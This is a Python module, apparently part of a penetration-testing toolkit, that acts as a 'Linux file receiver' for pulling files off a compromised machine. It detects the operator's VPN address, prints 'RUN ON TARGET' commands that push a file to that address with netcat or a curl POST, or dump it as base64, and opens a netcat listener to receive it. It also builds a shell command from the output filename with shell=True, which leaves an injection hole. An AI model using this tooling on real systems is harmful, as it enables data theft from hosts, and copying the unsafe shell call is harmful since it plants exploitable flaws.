import base64
import shutil
import socket
import subprocess

from pathlib import Path

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box

console = Console()


# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
M = '\033[35m'
W_BOLD = '\033[1m'


# =========================================================
# HELPERS
# =========================================================

def detect_ip():

    try:
        result = subprocess.check_output(
            ["ip", "-br", "addr", "show", "dev", "tun0"],
            text=True
        )

        parts = result.split()

        if len(parts) >= 3:
            return parts[2].split("/")[0]

    except Exception:
        pass

    try:

        s = socket.socket(
            socket.AF_INET,
            socket.SOCK_DGRAM
        )

        s.connect(("1.1.1.1", 80))

        ip = s.getsockname()[0]

        s.close()

        return ip

    except Exception:

        return "127.0.0.1"


def copy_clipboard(text):

    try:

        import pyperclip

        pyperclip.copy(text)

        return True

    except Exception:

        return False


def require_outfile(args):

    outfile = getattr(args, "file", None)

    if not outfile:

        console.print("[red][!] Missing output filename[/red]")

        return None

    return Path(outfile)


def _print_script(lines, title):

    #
    # No box — a bordered panel puts a leading "│" on every line, which a
    # drag-select-to-copy off the terminal (no clipboard access, over SSH,
    # etc.) would grab too. A rule frames it without touching the text.
    #
    console.print()
    console.rule(f"[bold yellow]▸ {title}[/bold yellow]", style="yellow", align="left")
    console.print()

    for line in lines:
        console.print(f"[bold yellow]{line}[/bold yellow]", soft_wrap=True, highlight=False)

    console.print()


# =========================================================
# NC RECEIVER
# =========================================================

def mode_nc(
    outfile,
    ip,
    port
):

    helper = (
        f"nc {ip} {port} < {outfile.name}"
    )

    _print_script([helper], "RUN ON TARGET")

    copy_clipboard(helper)

    console.print("[green]→ copied to clipboard[/green]")
    console.print()
    console.print(f"[yellow][*] Listening on {port} -> {outfile}[/yellow]", highlight=False)

    subprocess.run(
        f"nc -lvnp {port} > '{outfile}'",
        shell=True
    )


# =========================================================
# HTTP RECEIVER
# =========================================================

def mode_http(
    outfile,
    ip,
    port
):

    helper = (
        f"curl -X POST "
        f"--data-binary @{outfile.name} "
        f"http://{ip}:{port}"
    )

    _print_script([helper], "RUN ON TARGET")

    copy_clipboard(helper)

    console.print("[green]→ copied to clipboard[/green]")
    console.print()
    console.print(f"[yellow][*] Listening on {port} -> {outfile}[/yellow]", highlight=False)

    subprocess.run(
        f"nc -lvnp {port} > '{outfile}'",
        shell=True
    )


# =========================================================
# OFFLINE RECEIVER
# =========================================================

def mode_offline(outfile):

    helper = (
        f"echo; base64 {outfile.name}"
        f" | tr -d '\\n'; echo;"
    )

    _print_script([helper], "RUN ON TARGET")

    copy_clipboard(helper)

    console.print("[green]→ copied to clipboard[/green]")
    console.print()
    console.print("[bold blue][*][/bold blue] Paste the base64 output below (Ctrl-D when done):")
    console.print()

    data = input()

    decoded = base64.b64decode(data)

    outfile.write_bytes(decoded)

    console.print(f"[green][+] Saved -> {outfile}[/green]", highlight=False)


# =========================================================
# MENU
# =========================================================

def choose_mode():

    table = Table(box=None, show_header=False, pad_edge=False, padding=(0, 2, 0, 0))
    table.add_column(style="bold cyan", no_wrap=True)
    table.add_column(style="white")
    table.add_column(style="dim")

    table.add_row("[1] HTTP", "curl POST", "one-shot receiver, decodes on arrival")
    table.add_row("[2] NC", "raw netcat", "simplest, needs an open listener port")
    table.add_row("[3] Offline", "base64 paste", "no network in/out at all")

    console.print()
    console.print(
        Panel(
            table,
            title="[bold white]LINUX FILE RECEIVER[/bold white]",
            title_align="left",
            border_style="blue",
            box=box.ROUNDED,
            padding=(1, 2),
        )
    )

    choice = input(f"\n{B}select> {W}").strip()

    return {
        "1": "http",
        "2": "nc",
        "3": "offline",
    }.get(choice)


# =========================================================
# PUBLIC API
# =========================================================

def receive_file(
    outfile,
    method=None,
    ip=None,
    port=None
):

    outfile = Path(outfile)

    if not ip:
        ip = detect_ip()

    if not method:
        method = choose_mode()

    if method == "nc":

        mode_nc(
            outfile,
            ip,
            port or 9001
        )

    elif method == "http":

        mode_http(
            outfile,
            ip,
            port or 8080
        )

    elif method == "offline":

        mode_offline(outfile)


def run(data=None, cred=None, args=None):

    outfile = require_outfile(args)

    if not outfile:
        return data

    method = getattr(
        args,
        "method",
        None
    )

    receive_file(
        outfile=outfile,
        method=method
    )

    return data
